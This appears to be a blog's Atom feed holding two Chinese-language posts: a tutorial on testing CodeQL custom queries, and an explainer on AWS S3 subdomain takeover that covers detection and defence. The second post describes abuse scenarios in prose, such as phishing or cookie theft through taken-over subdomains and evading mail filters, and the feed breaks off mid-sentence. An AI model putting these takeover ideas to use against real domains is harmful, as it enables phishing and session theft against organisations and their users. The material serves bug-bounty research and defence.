<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>TonghuaRoot&#39;s BloG. - Cyber security enthusiast, not Hacker.</title>
  
  <subtitle>Know it, then Hack it!</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://tonghuaroot.com/"/>
  <updated>2021-09-18T09:54:35.095Z</updated>
  <id>https://tonghuaroot.com/</id>
  
  <author>
    <name>TonghuaRoot</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>为 CodeQL 自定义规则编写测试文件</title>
    <link href="https://tonghuaroot.com/2021/09/18/Write-test-files-for-CodeQL-custom-rules/"/>
    <id>https://tonghuaroot.com/2021/09/18/Write-test-files-for-CodeQL-custom-rules/</id>
    <published>2021-09-18T09:42:20.000Z</published>
    <updated>2021-09-18T09:54:35.095Z</updated>
    
    <content type="html"><![CDATA[<h1 id="为-CodeQL-自定义查询规则编写测试文件"><a href="#为-CodeQL-自定义查询规则编写测试文件" class="headerlink" title="为 CodeQL 自定义查询规则编写测试文件"></a>为 CodeQL 自定义查询规则编写测试文件</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近花了点时间研究 CodeQL，写了几个查询规则，效果还凑活。在翻 CodeQL 的官方库的时候里头有一些 test 文件啥的，这对我理解官方的查询规则非常有帮助。然后总 jio 着自己写的这几个规则差了点意思，就学了下 CodeQL 的测试文件怎么写，一边看文档一边测试，于是便有了本文。</p><p>CodeQL 提供了一个测试框架，用于对查询规则进行自动化回归测试，确保我们自定义的查询规则符合预期。</p><p>在执行查询测试时，CodeQL 会对用户期望的结果，和执行测试时实际产生的结果进行比较。如果预期的结果与实际产生的结果不同，该查询测试将会失败。为了 Fix 该条测试，我们应该迭代查询规则以及预期的查询结果，直到预期结果与实际结果完全一致。</p><p>本文主要介绍如何创建测试文件，以及使用 <figure class="highlight plain"><figcaption><span>run```子命令执行测试。</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">全文主要包含如下内容：</span><br><span class="line"></span><br><span class="line">1. 为自定义查询设置测试 QL 包</span><br><span class="line">2. 为查询规则设置测试文件</span><br><span class="line">3. 运行 ```codeql test run</span><br></pre></td></tr></table></figure></p><ol start="4"><li>示例</li><li>后记</li><li>References</li></ol><h2 id="0x01-为自定义查询设置测试-QL-包"><a href="#0x01-为自定义查询设置测试-QL-包" class="headerlink" title="0x01 为自定义查询设置测试 QL 包"></a>0x01 为自定义查询设置测试 QL 包</h2><p>CodeQL 测试文件必须存储于指定的测试 QL 包中，即我们将包含 <figure class="highlight plain"><figcaption><span>文件的目录称为“测试 QL 包（test QL pack）”，```qlpack.yml``` 文件格式如下：</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>name: <name-of-test-pack><br>version: 0.0.0<br>libraryPathDependencies: <codeql-libraries-and-queries-to-test><br>extractor: <language-of-code-to-test><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">在 CodeQL 的官方库中，Java Queries 的 test QL pack 为 codeql/java/ql/test，其中 [qlpack.yml](https://github.com/github/codeql/blob/main/java/ql/test/qlpack.yml) 内容为：</span><br></pre></td></tr></table></figure></language-of-code-to-test></codeql-libraries-and-queries-to-test></name-of-test-pack></p><p>name: codeql/java-tests<br>version: 0.0.2<br>dependencies:<br>    codeql/java-all: “<em>“<br>    codeql/java-queries: “</em>“<br>extractor: java<br>tests: .<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```libraryPathDependencies``` 的值指定了测试哪些查询规则。```extractor``` 定义哪一个语言的 CLI 将被用于基于 QL pack 中的代码文件创建测试数据库，详情可参考链接 [3]。</span><br><span class="line"></span><br><span class="line">在 CodeQL 的官方仓库中，每一个语言均有一个 ```src``` 目录，```ql/&lt;language&gt;/ql/src```，包含库和查询规则（我看了一下，实际上库是放在与 src 同级的 lib 目录下），同级目录下还有一个 test 目录，即为用于测试这些库和查询规则的测试文件存放位置。</span><br><span class="line"></span><br><span class="line">test 目录被定义为 test QL Pack，其中包含若干个子目录，每个子目录的作用如下：</span><br><span class="line"></span><br><span class="line">1. ```query-tests```  目录下，包含一系列子目录，每一个子目录下包含测试代码，和一个 QL reference 文件，用于指定对应的查询规则。</span><br><span class="line">2. ```library-tests``` 目录下，包含一系列列子目录，每一个子目录下包含测试代码，以及一个查询规则，该查询规则引用了对应的库，作为单元测试使用。</span><br><span class="line">3. ```experimental``` 目录下，包含一系列子目录。Github Security Lab 搞了一个 bounty 项目[4]，接收外部安全研究员提交过来的有价值的查询规则，相关查询规则的测试文件均会放在该目录下。</span><br><span class="line"></span><br><span class="line">## 0x02 为查询规则设置测试文件</span><br><span class="line"></span><br><span class="line">对于每一个我们想要测试的查询规则来说，我们都应该在测试 QL 包（test QL pack）下创建一个子目录。然后在运行测试命令之前增加下列文件：</span><br><span class="line"></span><br><span class="line">1. 一个 query reference 文件（.qlref 文件），定义需要测试的查询规则的位置。该位置定义为包含查询规则的 QL pack 根目录下的相对位置。如：```experimental/Security/CWE/CWE-759/HashWithoutSalt.ql``` 通常情况下，这个 QL pack 的目录会在 test pack 中通过 ```libraryPathDependencies``` 进行指定，参考链接[5]。</span><br><span class="line"></span><br><span class="line">如果我们的查询规则位于 test 目录下，则无需定义 query reference 文件，但是从通用的最佳实践的角度来讲，仍然建议将查询规则与 test 文件分离在不同的目录下。唯一的例外是对 QL 库进行单元测试，其更倾向于存储与 test pack 中，和生成告警和 path 的查询规则进行分离。</span><br><span class="line"></span><br><span class="line">2. 一个查询规则针对的测试代码，这应该包含一个或多个文件，包含查询规则可以识别的代码示例。</span><br><span class="line"></span><br><span class="line">我们可以定义一个预期的结果，用于与当我们针对测试代码执行指定的查询规则时产生的结果进行比较，该文件为 ```.expected``` 后缀。我们可以使用测试命令生成对应的 ```.expected``` 文件。（需要注意的是，当我们采用 CodeQL CLI 2.0.2–2.0.6 时，需要创建一个空的 ```.expected``` 文件，否则测试命令无法找到 test 查询。）</span><br><span class="line"></span><br><span class="line">注：</span><br><span class="line"></span><br><span class="line">1. ```.ql```、```.qlref``` 、```.expected```  文件必须采用统一的文件命名。</span><br><span class="line">2. 如果想要在测试命令后直接指定 ```.ql``` 文件，必须有与之相对应的 ```.expected``` 文件。举例来说，如果查询规则名为 ```MyJavaQuery.ql```，预期的执行结果文件必须为 ```MyJavaQuery.expected```。</span><br><span class="line">3. 如果需要在命令中指定 ```.qlref``` 文件，也必须有与之相对应的 ```.expected``` 文件，但此处查询规则文件可以有与之不相同的名字。</span><br><span class="line">4. 示例代码文件名字不是必须与其他的测试文件统一，在 .qlref （或 .ql）文件相邻的示例代码以及子目录中的文件均会被用于创建测试数据库。因此，不要将测试文件保存在上级目录中。</span><br><span class="line"></span><br><span class="line">## 0x03 运行 ```codeql test run</span><br></pre></td></tr></table></figure></p><p>通过如下命令可以执行 CodeQL 的查询测试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql test run &lt;test|dir&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><figcaption><span>参数可以是如下内容的一个或多个：</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1. ```.ql``` 文件地址</span><br><span class="line">2. ```.qlref``` 文件地址</span><br><span class="line">3. 用于递归检索 ```.ql``` 和 ```.qlref``` 文件位置的目录</span><br><span class="line"></span><br><span class="line">也可以指定如下参数：</span><br><span class="line"></span><br><span class="line">```--threads```，可选参数，用于指定运行查询规则时的线程数，默认值为 1，可以指定更多的线程数加快查询执行速度。指定 0 将会匹配 逻辑处理器（logical processors）的数量。</span><br><span class="line"></span><br><span class="line">详细命令选项可以参考链接[6]。</span><br><span class="line"></span><br><span class="line">## 0x04 示例</span><br><span class="line"></span><br><span class="line">下列的示例代码展示了，如何为一个查询规则设置测试文件，该查询规则的内容是查询 Java 代码中 if 语句中，空的 then 代码块。包括如何增加自定义的查询规则和自定义的测试文件到一个 CodeQL 仓库 checkout 之外的 QL pack 中。</span><br><span class="line"></span><br><span class="line">### 一、准备查询规则和相应的测试文件</span><br><span class="line"></span><br><span class="line">1. 写一个查询规则， 举例来说，如下查询规则， 可以发现 Java 代码中空的 then 代码块：</span><br></pre></td></tr></table></figure><p>import java</p><p>from IfStmt ifstmt<br>where ifstmt.getThen() instanceof EmptyStmt<br>select ifstmt, “This if statement has an empty then.”<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. 在我们自建的查询目录中，创建一个名为 ```EmptyThen.ql``` 的文件写入上述文件内容。如：```C:\Users\Administrator\Downloads\CodeQL_HOME\custom-queries\java\queries\EmptyThen.ql</span><br></pre></td></tr></table></figure></p><ol start="3"><li>在 <figure class="highlight plain"><figcaption><span>目录下创建 ```qlpack.yml``` 文件，定义 QL Pack，文件内容如下：</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><p>name: my-custom-queries<br>version: 0.0.0<br>libraryPathDependencies: codeql-java<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">关于 QL packs 的更多信息，可以参考链接[7]。</span><br><span class="line"></span><br><span class="line">4. 在 test 目录（custom-queries/java/tests）下，创建 ```qlpack.yml``` 文件，定义为 test QL pack，文件内容如下，注意 ```libraryPathDependencies``` 的值要与我们自定义的查询 QL pack 相匹配：</span><br></pre></td></tr></table></figure></p><p>name: my-query-tests<br>version: 0.0.0<br>libraryPathDependencies: my-custom-queries<br>extractor: java<br>tests: .<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```qlpack.yml``` 文件声明了，```my-query-tests``` 依赖 ```my-custom-queries```，同时该文件也声明了，CLI 会使用 Java ```extractor``` 创建数据库。支持 CLI 2.1.0 及以上版本，```tests: .``` 行，声明在 pack 中的所有 ```.ql``` 文件当我们执行 ```codeql test run``` 命令指定 ```--strict-test-discovery``` 参数时都会被当做 ```test``` 进行运行。</span><br><span class="line"></span><br><span class="line">5. 在 Java test pack 中创建一个测试目录，用于包含与 ```EmptyThen.ql``` 相关联的测试目录，如：```custom-queries/java/tests/EmptyThen</span><br></pre></td></tr></table></figure></p><ol start="6"><li>在这个新的目录中，创建 EmptyThen.qlref 定义EmptyThen.ql 的位置。查询规则的地址，必须指定为包含查询的 QL pack 的相对根路径。在被例中，查询规则所在 QL Pack 的顶级目录为 my-custom-queries，其作为依赖被声明在了 my-query-tests 中。因此，EmptyThen.qlref 中的内容为 EmptyThen.ql 即可。</li><li>创建用于测试的代码片段，如下代码片段在第三行包含了一个空的 if 代码块，保存在 custom-queries/java/tests/EmptyThen/Test.java 中。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">class Test &#123;</span><br><span class="line">  public void problem(String arg) &#123;</span><br><span class="line">    if (arg.isEmpty())</span><br><span class="line">    ;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(&quot;Empty argument&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public void good(String arg) &#123;</span><br><span class="line">    if (arg.isEmpty()) &#123;</span><br><span class="line">        System.out.println(&quot;Empty argument&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二、执行测试"><a href="#二、执行测试" class="headerlink" title="二、执行测试"></a>二、执行测试</h3><p>移动到 custom-queries 目录，执行 <figure class="highlight plain"><figcaption><span>test run java/tests/EmptyThen``` 命令进行测试。</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">执行测试时，CodeQL 会进行如下几项操作：</span><br><span class="line"></span><br><span class="line">1. 在 EmptyThen 目录下查找测试文件</span><br><span class="line">2. 基于 EmptyThen 目录下的 .java 文件生成 CodeQL 数据库</span><br><span class="line">3. 编译 EmptyThen.qlref 中引用的查询规则</span><br><span class="line"></span><br><span class="line">如果第 3 步骤失败了，这可能是由于 CodeQL 无法找到自定义的 QL Pack 导致的，重新运行命令，并且指定自定义 QL Pack 的位置，如：```codeql test run --search-path=java java/tests/EmptyThen```，如何将搜索地址（search path）作为配置文件的一部分，可以参考链接[8]。</span><br><span class="line"></span><br><span class="line">4. 通过运行查询规则、执行测试，生成 EmptyThen.actual 结果文件</span><br><span class="line">5. 检查 EmptyThen.expected 文件和 .actual 文件内容进行比较</span><br><span class="line">6. 报告测试结果，在本例中，存在一个失败的 case ```0 tests passed; 1 tests failed:```，测试失败是因为我们没有增加 EmptyThen.expected 文件</span><br><span class="line"></span><br><span class="line">![1](Pasted image 20210918064759.png)</span><br><span class="line"></span><br><span class="line">### 三、查看查询规则的测试输出</span><br><span class="line"></span><br><span class="line">CodeQL 会在 EmptyThen 目录中，生成如下测试结果：</span><br><span class="line"></span><br><span class="line">1. EmptyThen.actual - 查询规则生成的真实测试结果</span><br><span class="line">2. EmptyThen.testproj - 可以加载进 VS Code 用于 debug test 失败原因的测试数据库。当测试完全成功，测试数据库会被自动删除，可以通过 ```--keep-databases``` 参数保留该测试数据库。</span><br><span class="line"></span><br><span class="line">在本例中，测试失败符合预期，并且容易被解决。EmptyThen.actual 中的文件内容如下：</span><br></pre></td></tr></table></figure></p><p>| Test.java:3:5:3:22 | if (…) | This if statement has an empty then. |<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">文件中包含了一张表，一列是查询结果的代码位置，接下来每一列是查询规则，```select``` clause 的输出。由于结果符合预期，我们可以将该文件名更新为 EmptyThen.expected 作为符合预期的文件。</span><br><span class="line"></span><br><span class="line">此时，重新运行测试命令，将会执行成功，所有的测试用例将会通过。</span><br><span class="line"></span><br><span class="line">![2](Pasted image 20210918065511.png)</span><br><span class="line"></span><br><span class="line">如果查询结果发生了改变，举例来说，如果你修改了查询规则的 select 语句，测试将会失败。对于失败的测试结果，CLI 的输出包括 EmptyThen.expected 和 EmptyThen.actual 的 diff 内容内容，这些信息可以用来 debug 简单的 test 失败场景。</span><br><span class="line"></span><br><span class="line">对于难以去 debug 的复杂 test 场景，我们可以导入 EmptyThen.testproj 至 CodeQL for VS Code 中，执行 EmptyThen.ql，分析针对 Test.java 的查询结果，详情可以参考链接 [9]。</span><br><span class="line"></span><br><span class="line">## 0x05 后记</span><br><span class="line"></span><br><span class="line">最后晒一下，我的几个自定义查询规则的测试执行结果（官方示例就是直来直去的 Java 代码，直接编译即可，我的是 Spring Boot 下头的几个场景，所以会复杂一丢丢）：</span><br></pre></td></tr></table></figure></p><p>codeql test run java/ql/test/experimental/query-tests/security/XXX –search-path=java –show-extractor-output<br><code>`</code></p><p><img src="Pasted image 20210918092456.png" alt="3"></p><h2 id="0x06-References"><a href="#0x06-References" class="headerlink" title="0x06 References"></a>0x06 References</h2><ol><li>codeql/java/ql/test/qlpack.yml - <a href="https://github.com/github/codeql/blob/main/java/ql/test/qlpack.yml" target="_blank" rel="noopener">https://github.com/github/codeql/blob/main/java/ql/test/qlpack.yml</a></li><li>Testing custom queries - <a href="https://codeql.github.com/docs/codeql-cli/testing-custom-queries/" target="_blank" rel="noopener">https://codeql.github.com/docs/codeql-cli/testing-custom-queries/</a></li><li>About QL packs - <a href="https://codeql.github.com/docs/codeql-cli/about-ql-packs/" target="_blank" rel="noopener">https://codeql.github.com/docs/codeql-cli/about-ql-packs/</a></li><li>Github Security Lab Bounty Project - <a href="https://hackerone.com/github-security-lab?type=team&amp;view_policy=true" target="_blank" rel="noopener">https://hackerone.com/github-security-lab?type=team&amp;view_policy=true</a></li><li>Query reference files - <a href="https://codeql.github.com/docs/codeql-cli/query-reference-files/" target="_blank" rel="noopener">https://codeql.github.com/docs/codeql-cli/query-reference-files/</a></li><li>test run - <a href="https://codeql.github.com/docs/codeql-cli/manual/test-run/" target="_blank" rel="noopener">https://codeql.github.com/docs/codeql-cli/manual/test-run/</a></li><li>About QL packs - <a href="https://codeql.github.com/docs/codeql-cli/about-ql-packs/" target="_blank" rel="noopener">https://codeql.github.com/docs/codeql-cli/about-ql-packs/</a></li><li>Specifying command options in a CodeQL configuration file - <a href="https://codeql.github.com/docs/codeql-cli/specifying-command-options-in-a-codeql-configuration-file/#specifying-command-options-in-a-codeql-configuration-file" target="_blank" rel="noopener">https://codeql.github.com/docs/codeql-cli/specifying-command-options-in-a-codeql-configuration-file/#specifying-command-options-in-a-codeql-configuration-file</a></li><li>Analyzing your projects - <a href="https://codeql.github.com/docs/codeql-for-visual-studio-code/analyzing-your-projects/#analyzing-your-projects" target="_blank" rel="noopener">https://codeql.github.com/docs/codeql-for-visual-studio-code/analyzing-your-projects/#analyzing-your-projects</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;为-CodeQL-自定义查询规则编写测试文件&quot;&gt;&lt;a href=&quot;#为-CodeQL-自定义查询规则编写测试文件&quot; class=&quot;headerlink&quot; title=&quot;为 CodeQL 自定义查询规则编写测试文件&quot;&gt;&lt;/a&gt;为 CodeQL 自定义查询规则编写测试
      
    
    </summary>
    
    
      <category term="CodeQL, SAST" scheme="https://tonghuaroot.com/tags/CodeQL-SAST/"/>
    
  </entry>
  
  <entry>
    <title>AWS S3 subdomain takeover</title>
    <link href="https://tonghuaroot.com/2021/04/10/AWS-S3-subdomain-takeover/"/>
    <id>https://tonghuaroot.com/2021/04/10/AWS-S3-subdomain-takeover/</id>
    <published>2021-04-10T11:59:31.000Z</published>
    <updated>2021-05-07T11:59:59.780Z</updated>
    
    <content type="html"><![CDATA[<p>浅析 AWS S3 子域名接管漏洞</p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>哈喽，大家好，我是童话。</p><p>前段时间和 @鶇 师傅讨论了一个特殊场景下的子域名接管漏洞，蛮 trick 的一个利用方法。我们见到有白帽子确实利用成功了，然后想了下，理论可行，但是我还没来得及做测试，所以不是今天讨论的重点，后面有机会再和大家分享。</p><p>步入正题，今天就以 AWS S3 为例，来跟大家分享一下什么是子域名接管（subdomain takeower）漏洞，以及如何挖掘子域名接管漏洞。</p><p>全文主要包含如下几部分内容：</p><ol><li>什么是子域名接管漏洞？</li><li>子域名接管漏洞有哪些危害（利用场景）？</li><li>什么是 AWS S3？</li><li>在什么场景下，AWS S3 会出现子域名接管漏洞？</li><li>（攻）如何自动化挖掘子域名接管漏洞？</li><li>（防）如何缓解子域名接管漏洞的危害？</li><li>碎碎念</li></ol><h2 id="0x01-什么是子域名接管漏洞？"><a href="#0x01-什么是子域名接管漏洞？" class="headerlink" title="0x01 什么是子域名接管漏洞？"></a>0x01 什么是子域名接管漏洞？</h2><p>子域名接管漏洞通常是由于域名管理员将企业拥有的子域名解析至未被使用的第三方 SaaS 服务上导致的。</p><p>攻击者可以控制该第三方服务页面的内容，子域名解析至这个可以被攻击者控制的第三方服务页面，进而可以利用该子域名接管漏洞实施攻击。</p><p>常见的由于错误的配置容易导致子域名接管漏洞的 SaaS 服务有：Github Pages、AWS S3、Wordpress 等，关于目前已知公开可以被接管的服务，可以参考链接[3]获取详细列表。</p><h2 id="0x02-子域名接管漏洞有哪些危害（利用场景）？"><a href="#0x02-子域名接管漏洞有哪些危害（利用场景）？" class="headerlink" title="0x02 子域名接管漏洞有哪些危害（利用场景）？"></a>0x02 子域名接管漏洞有哪些危害（利用场景）？</h2><p>说到这里，有的同学可能就会问了，域名管理员为什么要把子域名解析到未被使用的第三方服务上呢，这个人也太不专业了吧。</p><p>抛开专业与否不谈，就我遇到的几个案例来看，大多数情况是由于因为业务需求将子域名解析到了第三方服务上（比如说将子域名解析到 AWS S3 上托管一些静态的 HTML/JS 资源），但是由于业务调整，删除了这些不在使用的第三方服务（S3 Bucket 被删了），而此时的域名解析仍然存在，因此，产生了子域名接管漏洞，这种场景很常见。</p><p>那可能有的同学又要说了，这是网络资源管理不规范导致的啊，是不是这个企业的体量太小，没有规范的产品上线流程呢？是，也不是，一方面肯定是跟域名管理流程脱不开关系，另一方面这个和企业体量并不直接相关，反倒是越大的企业，因为其线上业务的复杂性，越容易出现这些照顾不到的薄弱点。（这也就是安全行业经常提到的，越大的企业越容易搞，越容易突破边界，反倒是那些挂了一个静态页面或者搞了个啥插件都没有的 Wordpress Blog，难搞的一逼。）</p><p>废话不多说，上几个数据支撑。</p><p>这个是我两年前挖到的一个微软的子域名接管漏洞：</p><p><img src="https://files.mdnice.com/user/12658/78b32fed-221b-4735-b10f-7b3e025cbb61.png" alt></p><p>经常玩 HackerOne 的朋友肯定会知道，星巴克和 Mail.ru 这几年在子域名接管漏洞上也是发出了大量的 bounty（赏金）[4]。</p><p><img src="https://files.mdnice.com/user/12658/126073a5-be75-4c9c-9d38-70aebea17c99.png" alt></p><p><img src="https://files.mdnice.com/user/12658/cfedfe53-b971-4c3f-be1b-e28d1f9af3f3.png" alt></p><p>可以看到，各类厂商都是非常愿意为这类漏洞买单的，我个人认为子域名接管漏洞，属于利用成本低，危害较大的一个漏洞类型。</p><p>那我们接下来就聊一下，子域名接管漏洞的实际危害和利用场景。</p><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><p>相对比较容易理解的一个场景就是，作为攻击者，可以直接篡改子域名的内容，种马，搞一些钓鱼啊这类的。</p><p>这里有一个很有意思的一个点，很多企业的邮件安全网关都会对邮件中的第三方链接、附件等进行安全检测、跑沙箱等等检测是否有异常行为。</p><p>而针对企业自身的域名往往会采用白名单放行，接下来怎么玩，不用我多说了吧。（也别问我是怎么知道的 hhh</p><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><p>再就是可以利用子域名接管漏洞，搞一些 XSS，劫持受害者的 Cookie。</p><p>比如说，一些站点会加载这个域名下的一些 js，而这个子域名中的内容是可控的，进而我们可以将这个子域名接管漏洞转换成一个存储型的 XSS 漏洞。</p><p>在一些微服务的业务场景下，主域名和子域名是共享 cookie 的，如果我们可以控制子域名的内容，也可以达到劫持主站 Cookie 的目的。</p><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><p>如果有小伙伴知道其他利用场景的话，可以在文章下方留言讨论分享哈。</p><h2 id="0x03-什么是-AWS-S3？"><a href="#0x03-什么是-AWS-S3？" class="headerlink" title="0x03 什么是 AWS S3？"></a>0x03 什么是 AWS S3？</h2><p>给大家介绍一下今天的主角 AWS S3。</p><p>Amazon Simple Storage Service (Amazon S3) 是一种对象存储服务，提供行业领先的可扩展性、数据可用性、安全性和性能[5]。</p><p>我们可以使用 Amazon S3 随时在 Web 上的任何位置保存和取回任何数量的数据。可以使用简单而直观的 Web 界面 AWS 管理控制台来完成这些任务[6]。</p><p>AWS S3 提供静态网站托管的功能[7]。一个典型的业务场景就是，业务部门将一些静态 HTML/JS 资源存储在 S3 中，并启用静态网站托管功能。将其子域名解析至 S3 为其分配的静态网站 endpoint 上，供其用户访问。</p><h2 id="0x04-在什么场景下，AWS-S3-会出现子域名接管漏洞？"><a href="#0x04-在什么场景下，AWS-S3-会出现子域名接管漏洞？" class="headerlink" title="0x04 在什么场景下，AWS S3 会出现子域名接管漏洞？"></a>0x04 在什么场景下，AWS S3 会出现子域名接管漏洞？</h2><p>如前文所述，由于业务需求的变更，这个 S3 静态网站不在使用，业务部门将 S3 Bucket 删除，而域名管理员未删掉域名 CNAME 解析记录，任意 AWS 客户均可创建一个同名的 S3 Bucket，并控制 S3 Bukcet 中的内容，AWS S3 子域名接管漏洞便产生了。</p><h2 id="0x05-（攻）如何自动化挖掘子域名接管漏洞？"><a href="#0x05-（攻）如何自动化挖掘子域名接管漏洞？" class="headerlink" title="0x05 （攻）如何自动化挖掘子域名接管漏洞？"></a>0x05 （攻）如何自动化挖掘子域名接管漏洞？</h2><p>作为白帽子，我们现在已经知道了什么是子域名接管漏洞，以及子域名接管漏洞的危害，接下来我们要做的事情就是如何主动的发现这类子域名接管漏洞。</p><p>如何判断一个子域名是否存在子域名接管漏洞，一共有两个步骤：</p><ol><li>通过 DNS 解析情况，判断其是否解析到了第三方服务上</li><li>通过发起 HTTP（S）请求，判断响应内容是否包含指定特征（拿 AWS S3 举例来说，如果存在子域名接管漏洞的话，会返回 The specified bucket does not exist 特征。）</li></ol><p>还有一个场景，就是 NS 记录可控导致的子域名接管漏洞，详细的玩法可以参考 Kubernetes 的这个案例[8]。</p><p>在这里我向大家推荐一个检测子域名接管漏洞的开源项目 subjack[2]（我的全自动化漏洞发现平台，用了它的一部分指纹。）</p><p>安装和使用方法也比较简单，可以直接参考项目的 README。</p><p>我们可以将该工具集成到自动化漏洞发现工作流（workflow）中，自动化的域名资产发现，定期的子域名接管漏洞检测，添加一些私有的漏洞识别规则，实时告警等，这个有点偏离了本文的主题了，后面有机会再聊。</p><h2 id="0x06-（防）如何缓解子域名接管漏洞的危害？"><a href="#0x06-（防）如何缓解子域名接管漏洞的危害？" class="headerlink" title="0x06 （防）如何缓解子域名接管漏洞的危害？"></a>0x06 （防）如何缓解子域名接管漏洞的危害？</h2><p>其实作为防御型的团队来说，除了被动挨打之外，相比外部的攻击者，其实我们是有非常多的优势的：</p><ol><li>甲方团队拥有全量的资产信息，可以实时监控到资产的变化</li><li>从信息安全意识、研发流程等各个阶段介入，规范化域名解析流程</li><li>从架构上去优化，比如说解析到非核心业务子域名</li></ol><p>从源头上尽量避免漏洞产生，漏洞产生时第一时间检测到，以及漏洞即使被利用了，危害程度也会被大大降低，等多维度的覆盖到子域名接管漏洞的全生命周期。</p><p>关于甲方视角的漏洞发现，@FEEI 师傅写了一篇很棒的文章，有兴趣的朋友可以去参考一下[9]。</p><p>在缓解子域名接管漏洞方面，除了甲方团队要做很多事情之外，提供第三方服务厂商能做些什么吗？</p><p>一些厂商，在遇到这类问题的时候，肯定第一时间就甩锅啦，说这个用户配置的问题，和他们产品本身的安全性无关。</p><p>话虽然这样讲，但其实还是可以做一些事情来从源头上缓解这类问题的。</p><p>作为云计算行业担当，AWS 在这一点就做的相当不错，AWS 给 CloudFront 加了一个功能[10][11]，验证子域名确实归属当前客户（当前客户拥有该域名的配置权限），来彻底解决了 CloudFront 的子域名接管漏洞，我们可以和 CloudFront 子域名接管漏洞说永别啦！</p><h2 id="0x07-碎碎念"><a href="#0x07-碎碎念" class="headerlink" title="0x07 碎碎念"></a>0x07 碎碎念</h2><p>关于 AWS S3 子域名接管漏洞利用的一个坑点，S3 Bukcet 名字要和子域名完全相同的场景下才能利用子域名接管漏洞，如果名字不同是不能利用的。</p><p>这是因为当我们访问 S3 的静态网站时，S3 会根据 Host 